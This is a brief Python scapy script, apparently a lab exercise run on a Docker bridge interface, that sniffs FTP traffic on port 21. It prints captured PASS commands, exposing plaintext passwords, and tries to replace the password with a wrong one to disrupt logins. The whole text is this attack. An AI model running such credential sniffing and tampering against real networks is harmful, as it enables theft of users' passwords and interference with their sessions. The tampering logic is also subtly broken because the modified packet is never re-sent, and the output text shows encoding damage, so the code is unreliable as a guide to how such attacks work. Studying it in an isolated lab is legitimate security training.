from scapy.all import *

def modificar_pass(pkt):
    if pkt.haslayer(Raw):
        payload = pkt[Raw].load.decode(errors='ignore')
        if 'PASS' in payload:
            print(f"[ORIGINAL] {payload.strip()}")
            pkt[Raw].load = b"PASS contrasena_incorrecta\r\n"
            del pkt[IP].chksum
            del pkt[TCP].chksum
            print("[MODIFICADO] PASS contrasena_incorrecta")

print("Interceptando trÃ¡fico FTP... esperando PASS")
sniff(filter="tcp port 21", prn=modificar_pass, iface="docker0")
